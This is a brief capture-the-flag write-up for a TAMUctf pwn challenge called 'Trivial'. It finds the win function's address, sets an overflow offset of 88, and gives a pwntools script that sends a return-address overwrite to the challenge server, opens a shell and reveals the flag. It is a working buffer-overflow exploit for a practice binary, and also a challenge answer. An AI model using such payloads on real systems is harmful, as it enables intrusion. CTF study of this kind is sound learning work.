# Trivial

We are given some C code that we need to pwn, we can see that we need to trigger the "win" function, we can first get the address of the function like

```
readlf -s ./trivial
```

That returned 0x0000000000401132

We also know is a x64 bit program and we found the offset to be 88

We can use the following script to access the shell and get the flag


```
from pwn import *

p = remote("tamuctf.com", 443, ssl=True, sni="trivial")
payload = b'A' * 88
p.sendline(payload + p64(0x0000000000401132))
p.interactive()
```

We can ```cat flag.txt``` and get the flag


# Flag

> gigem{sorry_for_using_the_word_trivial}